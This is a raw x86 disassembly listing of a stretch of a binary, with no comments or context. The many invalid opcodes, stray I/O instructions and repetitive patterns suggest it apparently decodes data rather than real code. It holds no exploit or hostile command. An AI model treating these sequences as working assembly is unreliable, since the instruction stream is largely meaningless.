  41544d:	add    BYTE PTR [eax],dh
  41544f:	jns    0x41544e
  415451:	dec    esi
  415453:	jno    0x415452
  415455:	inc    dh
  415457:	ins    DWORD PTR es:[edi],dx
  415458:	std    
  415459:	(bad)  
  41545a:	xor    DWORD PTR [ecx-0x3],esi
  41545d:	push   DWORD PTR [esi+0x31fffd6d]
  415463:	ins    DWORD PTR es:[edi],dx
  415464:	std    
  415465:	push   DWORD PTR [ecx]
  415467:	ins    DWORD PTR es:[edi],dx
  415468:	add    DWORD PTR [eax],eax
  41546a:	xor    DWORD PTR [ebx+ebp*8],edx
  41546d:	add    edx,DWORD PTR [esi-0x70001881]
  415473:	jg     0x41545c
  415475:	add    esi,DWORD PTR [ecx]
  415477:	adc    al,0xe3
  415479:	add    eax,DWORD PTR [eax]
  41547b:	add    BYTE PTR [esi+0x14],bh
  41547e:	pop    es
  41547f:	test   BYTE PTR [ecx],ah
  415481:	xchg   esp,eax
  415482:	out    0x83,eax
  415484:	xor    DWORD PTR [edi+eiz*8+0x7143183],edx
  41548b:	test   BYTE PTR [ecx+0x14],al
  41548e:	out    0x3,eax
  415490:	inc    ecx
  415491:	adc    al,0xc7
  415493:	add    esi,DWORD PTR [ecx]
  415495:	adc    al,0xc7
  415497:	add    esp,DWORD PTR [ecx]
  415499:	xchg   esp,eax
  41549a:	mov    DWORD PTR [ebx+0x3c79431],0x83c79431
  4154a4:	inc    ecx
  4154a5:	xchg   esp,eax
  4154a6:	out    0x83,eax
  4154a8:	inc    ecx
  4154a9:	xchg   esp,eax
  4154aa:	out    0x3,eax
  4154ac:	xor    DWORD PTR [edi+eiz*8-0x186bce7d],edx
  4154b3:	add    esp,DWORD PTR [ecx]
  4154b5:	adc    al,0x7
  4154b7:	add    al,0x31
  4154b9:	adc    al,0x7
  4154bb:	add    al,0x21
  4154bd:	xchg   esp,eax
  4154be:	out    0x83,eax
  4154c0:	and    DWORD PTR [edi+eax*1],edx
  4154c3:	add    al,0x41
  4154c5:	adc    al,0x7
  4154c7:	test   BYTE PTR [ecx],dh
  4154c9:	xchg   esp,eax
  4154ca:	out    0x3,eax
  4154cc:	xor    DWORD PTR [edi+eiz*8],edx
  4154cf:	add    esi,DWORD PTR [ecx]
  4154d1:	xchg   esp,eax
  4154d2:	out    0x83,eax
  4154d4:	xor    DWORD PTR [edi+eax*8],edx
  4154d7:	and    DWORD PTR [ecx],0x14
  4154da:	out    0x3,eax
  4154dc:	and    DWORD PTR [edi+eax*8+0x21000003],edx
  4154e3:	adc    al,0xc7
  4154e5:	add    esi,DWORD PTR [ecx]
  4154e7:	xchg   esp,eax
  4154e8:	add    cl,ch
  4154ea:	xor    dl,BYTE PTR [eax+eax*1]
  4154ed:	jmp    0x94178a4
  4154f2:	lods   eax,DWORD PTR ds:[esi]
  4154f3:	adc    eax,DWORD PTR [eax]
  4154f5:	jmp    0xe9c178ac
  4154fa:	xor    ah,BYTE PTR [eax+eax*4]
  4154fd:	or     DWORD PTR [ebp+0x32e90013],esi
  415503:	adc    al,0x0
  415505:	or     DWORD PTR [ebp+0x2d090023],esi
  41550b:	and    al,0x80
  41550d:	jmp    0xc9417944
  415512:	mov    dl,0x13
  415514:	sub    cl,0x32
  415517:	and    al,0x80
  415519:	jmp    0xe9c178d0
  41551e:	mov    dl,0x13
  415520:	add    cl,ch
  415522:	xor    ah,BYTE PTR [eax+eax*4]
  415525:	jmp    0xc9c169dc
  41552a:	xor    dl,BYTE PTR [eax+eax*1]
  41552d:	leave  
  41552e:	mov    dl,0x24
  415530:	or     BYTE PTR [ecx],0xad
  415533:	and    al,0x0
  415535:	or     DWORD PTR ds:0xb2e90014,esi
  41553b:	adc    al,0x0
  41553d:	jmp    0x9c16974
  415542:	lods   eax,DWORD PTR ds:[esi]
  415543:	adc    al,0x0
  415545:	jmp    0x24f3554a
  41554a:	sub    cl,0x32
  41554d:	and    al,0x0
  41554f:	or     DWORD PTR ds:0x32c98014,esi
  415555:	and    al,0x0
  415557:	leave  
  415558:	mov    dl,0x14
  41555a:	or     cl,0x32
  41555d:	adc    al,0x80
  41555f:	leave  
  415560:	xor    ah,BYTE PTR [eax+eax*1]
  415563:	add    al,cl
  415565:	xchg   ecx,eax
  415566:	adc    BYTE PTR [eax],al
  415568:	cwde   
  415569:	adc    DWORD PTR [eax],eax
  41556b:	add    BYTE PTR [eax+0x68800091],bl
  415571:	xchg   ecx,eax
  415572:	add    BYTE PTR [eax],al
  415574:	mov    BYTE PTR [ecx],dl
  415576:	add    BYTE PTR [eax-0x7fefe7c8],al
  41557c:	cmp    BYTE PTR [eax-0x6e777ff0],bl
  415582:	adc    BYTE PTR [eax],al
  415584:	adc    BYTE PTR [ebx],0x0
  415587:	add    BYTE PTR [eax+0x13],bl
  41558a:	add    cl,BYTE PTR [eax]
  41558c:	pop    eax
  41558d:	adc    DWORD PTR [eax],eax
  41558f:	add    BYTE PTR [eax+0x11],dl
  415592:	add    cl,BYTE PTR [eax]
  415594:	dec    eax
  415595:	adc    eax,DWORD PTR [eax]
  415597:	or     BYTE PTR [eax+0x11],bl
  41559a:	add    BYTE PTR [eax],al
  41559c:	push   eax
  41559d:	adc    eax,DWORD PTR [edx]
  41559f:	add    BYTE PTR [eax+0x13],cl
  4155a2:	add    BYTE PTR [eax],cl
  4155a4:	inc    eax
  4155a5:	adc    DWORD PTR [edx],eax
  4155a7:	add    BYTE PTR [eax],ah
  4155a9:	adc    DWORD PTR [eax],eax
  4155ab:	or     BYTE PTR [eax],al
  4155ad:	add    BYTE PTR [eax],dl
  4155af:	adc    DWORD PTR [eax],eax
  4155b1:	or     BYTE PTR [eax],cl
  4155b3:	adc    DWORD PTR [edx],eax
  4155b5:	add    BYTE PTR [eax],ah
  4155b7:	adc    eax,DWORD PTR [edx]
  4155b9:	or     BYTE PTR [eax],al
  4155bb:	adc    DWORD PTR [edx],eax
  4155bd:	add    BYTE PTR [eax],bl
  4155bf:	adc    DWORD PTR [edx],eax
  4155c1:	or     BYTE PTR [eax],dl
  4155c3:	adc    eax,DWORD PTR [eax]
  4155c5:	add    BYTE PTR [eax],cl
  4155c7:	adc    DWORD PTR [eax],eax
  4155c9:	or     al,ah
  4155cb:	adc    BYTE PTR [eax],al
  4155cd:	add    al,bl
  4155cf:	adc    al,BYTE PTR [edx]
  4155d1:	or     al,cl
  4155d3:	adc    al,BYTE PTR [eax]
  4155d5:	add    al,cl
  4155d7:	adc    al,BYTE PTR [edx]
  4155d9:	add    al,bl
  4155db:	adc    BYTE PTR [edx],al
  4155dd:	or     BYTE PTR [ecx],dh
  4155df:	jae    0x4155e2
  4155e1:	add    ch,BYTE PTR [ecx]
  4155e3:	jae    0x4155e4
  4155e5:	add    DWORD PTR [ecx],esi
  4155e7:	cmp    edi,0xffffffff
  4155ea:	cmp    DWORD PTR [ebx-0x1],ebp
  4155ed:	add    DWORD PTR [ecx],esi
  4155ef:	imul   eax,DWORD PTR [ecx],0x2
  4155f2:	xor    DWORD PTR [ebx-0x1],esi
  4155f5:	jmp    FWORD PTR [ecx]
  4155f7:	add    DWORD PTR [ecx],0x0
  4155fa:	xor    DWORD PTR [ebx+0x6b3901ff],eax
  415600:	(bad)  
  415601:	push   DWORD PTR [ecx]
  415603:	imul   eax,DWORD PTR [ecx],0x0
  415606:	sub    DWORD PTR [ebx-0x1],ebp
  415609:	add    DWORD PTR [ecx],edi
  41560b:	imul   eax,DWORD PTR [ecx],0x0
  41560e:	cmp    DWORD PTR [ebx+0x1],esi
  415611:	add    al,BYTE PTR [eax]
  415613:	add    BYTE PTR [ecx],dh
  415615:	jae    0x415616
  415617:	push   DWORD PTR [ecx]
  415619:	imul   eax,DWORD PTR [ecx],0x2
  41561c:	xor    DWORD PTR [ebx-0x1],ebp
  41561f:	add    DWORD PTR [ecx],edi
  415621:	imul   edi,edi,0xffffffff
  415624:	sub    DWORD PTR [ebx+0x1],ebp
  415627:	add    BYTE PTR [ecx],dh
  415629:	imul   edi,edi,0xffffffff
  41562c:	xor    DWORD PTR [ebp+0x75310201],eax
  415632:	inc    DWORD PTR [ecx]
  415634:	sub    DWORD PTR [ebp-0x1],ebp
  415637:	jmp    FWORD PTR [ecx]
  415639:	test   DWORD PTR [ecx],eax
  41563b:	add    BYTE PTR [ecx],bh
  41563d:	ins    DWORD PTR es:[edi],dx
  41563e:	(bad)  
  41563f:	push   DWORD PTR [ecx]
  415641:	ins    DWORD PTR es:[edi],dx
  415642:	add    DWORD PTR [eax],eax
  415644:	xor    DWORD PTR [ebp+0x1],esi
  415647:	add    ch,BYTE PTR [ecx]
  415649:	test   edi,edi
  41564b:	(bad)  
  41564c:	cmp    DWORD PTR [ebp+0x1],ebp
  41564f:	add    dh,BYTE PTR [ecx]
  415651:	ins    DWORD PTR es:[edi],dx
  415652:	add    DWORD PTR [eax],eax
  415654:	sub    DWORD PTR [ebp-0x1],esi
  415657:	add    DWORD PTR [ecx],ebp
  415659:	adc    al,0xef
  41565b:	add    esi,DWORD PTR [ecx]
  41565d:	adc    al,0xef
  41565f:	add    DWORD PTR [ebx],esi
  415661:	adc    al,0xe7
  415663:	add    DWORD PTR [ebx],esi
  415665:	adc    al,0xdf
  415667:	add    esi,DWORD PTR [ecx]
  415669:	or     al,0xe7
  41566b:	add    esi,DWORD PTR [ebx]
  41566d:	or     al,0xef
  41566f:	add    DWORD PTR [ecx],esi
  415671:	or     al,0xdf
  415673:	add    DWORD PTR [ecx],esi
  415675:	adc    al,0xe7
  415677:	add    eax,DWORD PTR [eax]
  415679:	add    BYTE PTR [ebx],dh
  41567b:	or     al,0xef
  41567d:	add    eax,0x3ef1433
  415682:	xor    DWORD PTR [edi+ebx*8],edx
  415685:	add    esi,DWORD PTR [ebx]
  415687:	or     al,0xe7
  415689:	add    eax,0xe3e81433
  41568e:	out    dx,al
  41568f:	adc    ebp,DWORD PTR [eax-0x1c]
  415692:	data16 jnp 0x4156fd
  415695:	in     al,0x5e
  415697:	jnp    0x415700
  415699:	add    al,0x31
  41569b:	adc    al,0x67
  41569d:	in     al,0xce
  41569f:	adc    ebp,DWORD PTR [eax+0x4]
  4156a2:	mov    cl,0x14
  4156a4:	call   0xe85607ac
  4156a9:	jecxz  0x4156e1
  4156ab:	jnp    0x415694
  4156ad:	add    esi,DWORD PTR [ecx]
  4156af:	adc    al,0xe7
  4156b1:	jecxz  0x415659
  4156b3:	adc    al,0xe7
  4156b5:	jecxz  0x415655
  4156b7:	adc    al,0x68
  4156b9:	in     al,0x96
  4156bb:	adc    al,0x68
  4156bd:	add    al,0x31
  4156bf:	adc    al,0xe7
  4156c1:	add    esi,DWORD PTR [ecx]
  4156c3:	adc    al,0x67
  4156c5:	add    al,0xb1
  4156c7:	adc    ebp,eax
  4156c9:	add    esi,DWORD PTR [ecx+0x3103e813]
  4156cf:	adc    al,0xe7
  4156d1:	jecxz  0x4156b9
  4156d3:	jp     0x4156d5
  4156d5:	jmp    0xe841eb0c
  4156da:	sar    dl,cl
  4156dc:	jmp    FWORD PTR [eax+0x0]
  4156df:	add    BYTE PTR ds:0x32e90014,dh
  4156e5:	xchg   esp,eax
  4156e6:	add    al,ch
  4156e8:	sar    BYTE PTR [edx-0x3],cl
  4156eb:	imul   ecx,ebp,0x3568fd7a
  4156f1:	xchg   esp,eax
  4156f2:	add    al,ch
  4156f4:	xor    dl,BYTE PTR [eax+eax*1]
  4156f7:	imul   edx,DWORD PTR [ebp+0x2d69fd7a],0x92e90094
  415701:	jp     0x415700
  415703:	imul   edx,DWORD PTR [edx-0x6d980006],0x3267fffa
  41570d:	adc    al,0x0
  41570f:	imul   esi,DWORD PTR [edx],0x32e80094
  415715:	xchg   esp,eax
  415716:	add    cl,ch
  415718:	push   edx
  415719:	cli    
  41571a:	jmp    DWORD PTR [edi+0x52]
  41571d:	cli    
  41571e:	jmp    DWORD PTR [edi+0x32]
  415721:	adc    al,0x0
  415723:	jmp    0xe9416b5a
  415728:	xor    dl,BYTE PTR [eax+eax*1]
  41572b:	jmp    0x69415182
  415730:	adc    bh,BYTE PTR [edx-0x3]
  415733:	imul   esi,DWORD PTR [edx],0x32680094
  415739:	xchg   esp,eax
  41573a:	add    al,ch
  41573c:	xor    dl,BYTE PTR [eax+eax*1]
  41573f:	call   0x68415156
  415744:	add    BYTE PTR [eax],al
  415746:	adc    bh,BYTE PTR [edx-0x3]
  415749:	push   0x69fd7a12
  41574e:	xor    dl,BYTE PTR [eax+eax*1]
  415751:	add    BYTE PTR [ecx+0x75],bl
  415754:	jge    0x415756
  415756:	pop    ecx
  415757:	adc    eax,0x15c90000
  41575c:	add    BYTE PTR [eax],al
  41575e:	enter  0xfd75,0xff
  415762:	fst    DWORD PTR ds:0x75d90080
  415768:	std    
  415769:	dec    DWORD PTR [eax+0x75]
  41576c:	jge    0x41576e
  41576e:	dec    ecx
  41576f:	adc    eax,0x75990080
  415774:	std    
  415775:	call   FWORD PTR [eax]
  415777:	jne    0x415776
  415779:	dec    DWORD PTR [eax-0x76ff7feb]
  41577f:	jne    0x4157fe
  415781:	add    BYTE PTR [eax],bl
  415783:	adc    BYTE PTR [eax],al
  415785:	add    BYTE PTR [eax-0x77ff7feb],bl
  41578b:	jne    0x41578a
  41578d:	dec    DWORD PTR [eax]
  41578f:	jo     0x41580e
  415791:	add    BYTE PTR [eax+0x16],bl
  415794:	add    BYTE PTR [eax],al
  415796:	pop    eax
  415797:	push   ss
  415798:	or     BYTE PTR [edx],al
  41579a:	dec    eax
  41579b:	adc    eax,0x16480208
  4157a0:	add    BYTE PTR [edx+0x58],al
  4157a3:	adc    eax,0x16580008
  4157a8:	add    BYTE PTR [eax],al
  4157aa:	add    BYTE PTR [eax],al
  4157ac:	dec    eax
  4157ad:	adc    eax,0x15484000
  4157b2:	or     BYTE PTR [edx],al
  4157b4:	sbb    BYTE PTR [esi],dl
  4157b6:	or     BYTE PTR [eax+0x18],al
  4157b9:	adc    eax,0x16080008
  4157be:	add    BYTE PTR [edx],al
  4157c0:	or     BYTE PTR [esi],dl
  4157c2:	or     BYTE PTR [eax+0x18],al
  4157c5:	push   ss
  4157c6:	add    BYTE PTR [edx+0x18],al
  4157c9:	adc    eax,0x6b314208
  4157ce:	add    cl,BYTE PTR [eax]
  4157d0:	xor    DWORD PTR [ebx+0x1],ebp
  4157d3:	add    BYTE PTR [ecx+0x6b],dh
  4157d6:	add    DWORD PTR [eax],eax
  4157d8:	xor    ebp,DWORD PTR [ebx+0x1]
  4157db:	or     BYTE PTR [ecx+0x6b],dh
  4157de:	add    DWORD PTR [eax],ecx
  4157e0:	jno    0x41584d
  4157e2:	add    DWORD PTR [eax],eax
  4157e4:	xor    DWORD PTR [ebx+0x2],ebp
  4157e7:	add    BYTE PTR [ecx+0x6b],dh
  4157ea:	add    cl,BYTE PTR [eax]
  4157ec:	jae    0x415859
  4157ee:	add    cl,BYTE PTR [eax]
  4157f0:	jae    0x41585d
  4157f2:	add    al,BYTE PTR [eax]
  4157f4:	xor    ebp,DWORD PTR [ebx+0x1]
  4157f7:	or     bl,dh
  4157f9:	push   0x2
  4157fb:	add    cl,dh
  4157fd:	push   0x1
  4157ff:	add    BYTE PTR [ecx],dh
  415801:	imul   eax,DWORD PTR [ecx],0x0
  415804:	repz push 0x2
  415807:	or     BYTE PTR [ebx],dh
  415809:	imul   eax,DWORD PTR [ecx],0x0
  41580c:	xor    ebp,DWORD PTR [ebx+0x1]
  41580f:	add    BYTE PTR [eax],al
  415811:	add    bl,dh
  415813:	push   0x2
  415815:	or     BYTE PTR [ecx],dh
  415817:	imul   eax,DWORD PTR [ecx],0x8
  41581a:	xor    DWORD PTR [ebx+0x2],ebp
  41581d:	add    bl,dh
  41581f:	push   0x2
  415821:	add    BYTE PTR [ecx],dh
  415823:	imul   eax,DWORD PTR [ecx],0x0
  415826:	xor    ebp,DWORD PTR [ebx+0x1]
  415829:	add    cl,dh
  41582b:	push   0x1
  41582d:	or     BYTE PTR [ebx],dh
  41582f:	imul   eax,DWORD PTR [edx],0x0
  415832:	repz push 0x2
  415835:	or     BYTE PTR [ecx+0x6d],dh
  415838:	add    al,BYTE PTR [eax]
  41583a:	xor    ebp,DWORD PTR [ebp+0x1]
  41583d:	add    BYTE PTR [ecx+0x6d],dh
  415840:	add    DWORD PTR [eax],ecx
  415842:	jae    0x4158b1
  415844:	add    cl,BYTE PTR [eax]
  415846:	xor    edx,DWORD PTR [edi+eiz*8]
  415849:	add    bh,BYTE PTR [ecx]
  41584b:	aam    0xe6
  41584d:	add    dh,BYTE PTR [ecx]
  41584f:	adc    al,0xe7
  415851:	add    esi,DWORD PTR [ecx]
  415853:	adc    ah,bh
  415855:	add    edi,DWORD PTR [ecx]
  415857:	shl    dh,cl
  415859:	add    bh,BYTE PTR [ecx]
  41585b:	shl    dh,cl
  41585d:	add    ch,BYTE PTR [ecx]
  41585f:	adc    al,0xe7
  415861:	add    esi,DWORD PTR [ecx]
  415863:	shl    dh,cl
  415865:	add    bh,BYTE PTR [ecx]
  415867:	shl    dh,cl
  415869:	add    edi,DWORD PTR [ecx]
  41586b:	adc    ah,bh
  41586d:	add    esi,DWORD PTR [ecx]
  41586f:	adc    al,0xe7
  415871:	add    ebp,DWORD PTR [ecx]
  415873:	aam    0xe6
  415875:	add    eax,DWORD PTR [eax]
  415877:	add    BYTE PTR [ecx],dh
  415879:	shl    dh,cl
  41587b:	add    bh,BYTE PTR [ecx]
  41587d:	adc    al,0xe7
  41587f:	add    dh,BYTE PTR [ecx]
  415881:	adc    ah,bh
  415883:	add    dh,BYTE PTR [ecx]
  415885:	aam    0xe6
  415887:	add    edi,DWORD PTR [ecx]
  415889:	adc    al,0xe7
  41588b:	add    esi,DWORD PTR [ecx]
  41588d:	adc    al,0xe7
  41588f:	add    ebp,DWORD PTR [ecx]
  415891:	aam    0xe6
  415893:	add    al,0x29
  415895:	adc    ah,bh
  415897:	add    al,0x31
  415899:	aam    0xd6
  41589b:	add    esi,DWORD PTR [ecx]
  41589d:	xor    al,0xe7
  41589f:	add    esi,ecx
  4158a1:	xor    esp,edi
  4158a3:	inc    ebx
  4158a4:	xor    DWORD PTR [edi+edx*8],edx
  4158a7:	inc    ebx
  4158a8:	icebp  
  4158a9:	xor    esp,edi
  4158ab:	add    esi,ecx
  4158ad:	xor    esi,edi
  4158af:	add    esi,DWORD PTR [ecx]
  4158b1:	adc    al,0xf7
  4158b3:	inc    ebx
  4158b4:	icebp  
  4158b5:	xor    esp,edi
  4158b7:	add    esi,DWORD PTR [ecx+0x14]
  4158ba:	out    0x43,eax
  4158bc:	xor    DWORD PTR [edi+edx*8],esi
  4158bf:	inc    ebx
  4158c0:	jno    0x4158d6
  4158c2:	add    cl,ch
  4158c4:	xor    dl,ah
  4158c6:	(bad)  
  4158c7:	fdiv   DWORD PTR [edx]
  4158c9:	adc    al,0x20
  4158cb:	stc    
  4158cc:	xor    dl,ah
  4158ce:	(bad)  
  4158cf:	call   0xe9616d46
  4158d4:	xor    dl,BYTE PTR [eax+eiz*1]
  4158d7:	stc    
  4158d8:	jb     0x4158ee
  4158da:	add    cl,ch
  4158dc:	add    BYTE PTR [eax],al
  4158de:	xor    dl,BYTE PTR [eax+eax*1]
  4158e1:	fnstenv [edx]
  4158e3:	aam    0xff
  4158e5:	fdiv   DWORD PTR [edx+0x14]
  4158e8:	and    cl,ch
  4158ea:	jb     0x415900
  4158ec:	add    cl,ch
  4158ee:	jb     0x4158c4
  4158f0:	(bad)  
  4158f1:	clc    
  4158f2:	jb     0x415908
  4158f4:	and    cl,bh
  4158f6:	xor    dl,BYTE PTR [eax+eax*1]
  4158f9:	stc    
  4158fa:	xor    dl,ah
  4158fc:	pop    ds
  4158fd:	fnstenv [edx]
  4158ff:	aam    0x1f
  415901:	jmp    0xd9416d38
  415906:	repnz sar edi,cl
  415909:	call   0xf9612d00
  41590e:	repnz adc eax,DWORD PTR [eax]
  415911:	jmp    0xe9412d08
  415916:	repnz rcr DWORD PTR [edi],cl
  415919:	jmp    0xe9616d50
  41591e:	repnz adc esp,DWORD PTR [eax]
  415921:	fnstenv [edx]
  415923:	adc    al,0x0
  415925:	fnstenv [edx]
  415927:	aam    0x1f
  415929:	jmp    0xf9412d20
  41592e:	repnz rcr DWORD PTR [edi],cl
  415931:	jmp    0xf9412d68
  415936:	repnz adc eax,DWORD PTR [eax]
  415939:	stc    
  41593a:	xor    dl,BYTE PTR [eax+eiz*1]
  41593d:	add    BYTE PTR [eax],bl
  41593f:	adc    al,BYTE PTR [eax+0x0]
  415942:	add    BYTE PTR [eax],al
  415944:	or     dl,dl
  415946:	call   FWORD PTR [edi]
  415948:	or     BYTE PTR [edx],dl
  41594a:	add    BYTE PTR [eax],ah
  41594c:	call   0x9415922
  415951:	adc    al,BYTE PTR [eax]
  415953:	and    al,bh
  415955:	sar    DWORD PTR [edi],1
  415957:	and    BYTE PTR [eax],cl
  415959:	sar    BYTE PTR [edi],cl
  41595b:	add    al,bl
  41595d:	adc    DWORD PTR [eax+0x20],eax
  415960:	or     dl,dl
  415962:	aas    
  415963:	add    al,cl
  415965:	sar    DWORD PTR [edi],1
  415967:	and    al,cl
  415969:	adc    DWORD PTR [eax],eax
  41596b:	add    al,ch
  41596d:	adc    DWORD PTR [eax+0x20],eax
  415970:	enter  0x11,0x0
  415974:	enter  0xffd1,0xff
  415978:	enter  0x4011,0x20
  41597c:	test   al,0xd1
  41597e:	aas    
  41597f:	add    BYTE PTR [eax+0x78ffffd1],bl
  415985:	adc    DWORD PTR [eax+0x0],eax
  415988:	js     0x41595b
  41598a:	call   FWORD PTR [edi]
  41598c:	cwde   
  41598d:	adc    DWORD PTR [eax],eax
  41598f:	add    BYTE PTR [eax-0x77dfc02f],bl
  415995:	adc    DWORD PTR [eax],eax
  415997:	and    BYTE PTR [eax+0x11],bh
  41599a:	inc    eax
  41599b:	add    BYTE PTR [eax-0x2f],ch
  41599e:	call   FWORD PTR [edi]
  4159a0:	pop    eax
  4159a1:	adc    DWORD PTR [eax],esp
  4159a3:	add    BYTE PTR [edx+0x11],cl
  4159a6:	and    BYTE PTR [eax+eax*1],al
  4159a9:	add    BYTE PTR [edx+0x79],cl
  4159ac:	std    
  4159ad:	add    ebx,DWORD PTR [eax+0x11]
  4159b0:	add    BYTE PTR [eax],al
  4159b2:	pop    eax
  4159b3:	jns    0x4159b2
  4159b5:	dec    DWORD PTR [edx+0x79]
  4159b8:	std    
  4159b9:	add    esi,DWORD PTR [ecx]
  4159bb:	imul   edi,ecx,0xf96b311f
  4159c1:	pop    ds
  4159c2:	sub    eax,0x351ff969
  4159c7:	imul   eax,DWORD PTR [ecx],0x20
  4159ca:	xor    DWORD PTR [ebx+0x1],ebp
  4159cd:	add    BYTE PTR [ecx],dh
  4159cf:	imul   eax,DWORD PTR [ecx],0x1692d00
  4159d5:	add    BYTE PTR [ecx],dh
  4159d7:	imul   eax,DWORD PTR [ecx],0x0
  4159da:	sub    eax,0x35200169
  4159df:	imul   edi,ecx,0xf96ae6ff
  4159e5:	push   DWORD PTR [edx]
  4159e7:	imul   edi,ecx,0x169311f
  4159ed:	and    BYTE PTR [ecx],dh
  4159ef:	imul   edi,ecx,0xffffffff
  4159f2:	xor    ch,BYTE PTR [ecx+0x1]
  4159f5:	add    BYTE PTR ds:0x2d20016b,dh
  4159fb:	imul   edi,ecx,0x1f
  4159fe:	xor    eax,0x31200169
  415a03:	imul   eax,DWORD PTR [ecx],0x20
  415a06:	xor    eax,0x96fff96b
  415a0b:	push   0xfff9
  415a10:	mov    gs,WORD PTR [eax-0x7]
  415a13:	pop    ds
  415a14:	sub    eax,0x311ff96b
  415a19:	imul   eax,DWORD PTR [ecx],0x16b3100
  415a1f:	add    BYTE PTR ds:0x311ff96b,dh
  415a25:	imul   eax,DWORD PTR [ecx],0x0
  415a28:	xor    eax,0x311ff96b
  415a2d:	imul   eax,DWORD PTR [ecx],0x20
  415a30:	xor    DWORD PTR [ecx-0x7],ebp
  415a33:	push   DWORD PTR [edx]
  415a35:	adc    al,0xe9
  415a37:	sti    
  415a38:	ds adc cl,ch
  415a3b:	add    edx,DWORD PTR [ecx]
  415a3d:	adc    cl,ch
  415a3f:	add    edx,DWORD PTR [ecx+0x18]
  415a42:	jmp    0xe9558b4a
  415a47:	add    edx,DWORD PTR [ecx+0x14]
  415a4a:	out    0x3,eax
  415a4c:	xor    DWORD PTR [eax],ebx
  415a4e:	out    0xfb,eax
  415a50:	push   cs
  415a51:	sbb    bh,ah
  415a53:	add    edx,DWORD PTR [ecx+0x14]
  415a56:	out    0xfb,eax
  415a58:	push   ds
  415a59:	sbb    cl,ch
  415a5b:	sti    
  415a5c:	div    BYTE PTR [ebx-0x17]
  415a5f:	sti    
  415a60:	dec    esi
  415a61:	adc    al,0xe7
  415a63:	sti    
  415a64:	inc    esi
  415a65:	sbb    cl,ch
  415a67:	sti    
  415a68:	fidiv  WORD PTR [ebx-0x17]
  415a6b:	add    esi,DWORD PTR [ecx]
  415a6d:	sbb    cl,ch
  415a6f:	sti    
  415a70:	cs sbb bh,ah
  415a73:	add    eax,DWORD PTR [eax]
  415a75:	add    BYTE PTR [ecx],dl
  415a77:	sbb    bh,ah
  415a79:	sti    
  415a7a:	push   ds
  415a7b:	adc    al,0xe7
  415a7d:	add    esi,DWORD PTR [ecx]
  415a7f:	adc    al,0xe9
  415a81:	add    esi,DWORD PTR [ecx]
  415a83:	adc    al,0xe9
  415a85:	sti    
  415a86:	inc    esi
  415a87:	sbb    bh,ah
  415a89:	add    esi,DWORD PTR [ecx]
  415a8b:	adc    al,0xe9
  415a8d:	sti    
  415a8e:	ss adc al,0xe7
  415a91:	add    edx,DWORD PTR [ecx+0x18]
  415a94:	out    0xfb,eax
  415a96:	xchg   BYTE PTR [ebx-0x17],dh
  415a99:	add    esi,DWORD PTR [ecx]
  415a9b:	sbb    bh,ah
  415a9d:	sti    
  415a9e:	jbe    0x415ab7
  415aa0:	out    0xfb,eax
  415aa2:	outs   dx,BYTE PTR ds:[esi]
  415aa3:	jae    0x415a8e
  415aa5:	add    edx,DWORD PTR [ecx]
  415aa7:	adc    al,0x27
  415aa9:	hlt    
  415aaa:	pop    esi
  415aab:	and    esp,edi
  415aad:	repz push esi
  415aaf:	jae    0x415ab1
  415ab1:	jmp    0x294172e8
  415ab6:	cmp    eax,0x32e91017
  415abb:	adc    al,0x10
  415abd:	sub    DWORD PTR ds:0x35290d73,edi
  415ac3:	adc    al,0x0
  415ac5:	jmp    0x29516efc
  415aca:	xor    eax,0x32e90018
  415acf:	sbb    BYTE PTR [eax],dl
  415ad1:	sub    DWORD PTR ds:0x2e91017,eax
  415ad7:	pop    ss
  415ad8:	add    cl,ch
  415ada:	add    BYTE PTR [eax],al
  415adc:	add    dl,BYTE PTR [edi]
  415ade:	adc    BYTE PTR [ecx-0x16ffe8fe],ch
  415ae4:	loop   0x415b58
  415ae6:	std    
  415ae7:	test   eax,0xe9001432
  415aec:	xor    bl,BYTE PTR [eax]
  415aee:	adc    BYTE PTR [ecx-0x16efebce],ch
  415af4:	ret    0xd72
  415af7:	test   eax,0xe9fd72c2
  415afc:	ret    0x16
  415aff:	test   eax,0xa9001832
  415b04:	xor    bl,BYTE PTR [eax]
  415b06:	adc    cl,ch
  415b08:	mov    ds:0xa2a91016,al
  415b0d:	jb     0x415b0c
  415b0f:	jmp    0xe9416f46
  415b14:	xor    dl,BYTE PTR [eax+eax*1]
  415b17:	test   eax,0x29101832
  415b1c:	xor    eax,0x82e91014
  415b21:	jb     0x415b30
  415b23:	sub    DWORD PTR [ebp+0x16],esp
  415b26:	add    cl,ch
  415b28:	xor    bl,BYTE PTR [eax]
  415b2a:	add    BYTE PTR [eax],al
  415b2c:	or     BYTE PTR [eax+0x1],ch
  415b2f:	add    BYTE PTR [eax+0x16],cl
  415b32:	add    al,0x0
  415b34:	pop    eax
  415b35:	add    WORD PTR [eax],dx
  415b38:	pop    eax
  415b39:	data16 std 
  415b3b:	dec    DWORD PTR [eax]
  415b3d:	sbb    BYTE PTR [eax],al
  415b3f:	add    BYTE PTR [eax],al
  415b41:	add    BYTE PTR [eax],cl
  415b43:	sbb    BYTE PTR [eax+edx*1],al
  415b46:	sbb    BYTE PTR [esi-0x3],ah
  415b49:	call   FWORD PTR [eax+0x68]
  415b4c:	add    DWORD PTR [eax],eax
  415b4e:	or     BYTE PTR [esi-0x3],ah
  415b51:	cmovs  ebx,DWORD PTR [eax]
  415b54:	add    BYTE PTR [eax],al
  415b56:	pop    eax
  415b57:	sbb    BYTE PTR [eax],al
  415b59:	adc    BYTE PTR [eax],bl
  415b5b:	push   ss
  415b5c:	add    al,0x10
  415b5e:	enter  0x415,0x10
  415b62:	or     BYTE PTR [esi],dl
  415b64:	add    BYTE PTR [eax],dl
  415b66:	fcom   DWORD PTR ds:0x65980004
  415b6c:	std    
  415b6d:	bswap  eax
  415b6f:	adc    eax,0x65880000
  415b74:	add    DWORD PTR [eax],edx
  415b76:	cwde   
  415b77:	adc    eax,0x15980004
  415b7c:	add    BYTE PTR [eax],dl
  415b7e:	enter  0x415,0x10
  415b82:	enter  0xfd65,0xf
  415b86:	fsub   DWORD PTR [ebp-0x3]
  415b89:	sets   BYTE PTR ds:0x65c80000
  415b90:	add    DWORD PTR [eax],edx
  415b92:	mov    BYTE PTR [ebp+0x1],ah
  415b95:	add    BYTE PTR [eax-0x27fffe9b],bl
  415b9b:	gs std 
  415b9d:	dec    DWORD PTR [eax+0x68]
  415ba0:	std    
  415ba1:	dec    DWORD PTR [eax+0x18]
  415ba4:	add    al,0x0
  415ba6:	add    BYTE PTR [eax],al
  415ba8:	xor    DWORD PTR [ebx+0x1],edi
  415bab:	add    BYTE PTR [ecx+0x7b],al
  415bae:	icebp  
